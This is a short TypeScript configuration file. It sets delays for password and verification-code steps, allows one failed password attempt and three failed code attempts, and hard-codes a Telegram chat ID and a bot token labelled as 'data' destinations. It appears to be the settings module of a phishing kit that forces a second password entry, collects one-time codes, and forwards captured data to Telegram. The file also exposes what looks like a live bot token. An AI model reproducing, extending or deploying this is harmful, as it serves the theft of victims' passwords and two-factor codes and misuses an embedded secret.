interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    password_loading_time: number;
  };
  telegram: {
    data_chatid: string;
    data_token: string;
  };
}
const defaultConfig: Config = {
  settings: {
    code_loading_time: 12000,
    max_failed_code_attempts: 3,
    max_failed_password_attempts: 1,
    password_loading_time: 8000,
  },
  telegram: {
    data_chatid: "-1002275895232",
    data_token: "7521413873:AAGI7lAk_B9c5U_T9dyglS_Bhlg73VxMrwU",
  },
};
const getConfig = (): Config => {
  return defaultConfig;
};

export default getConfig;
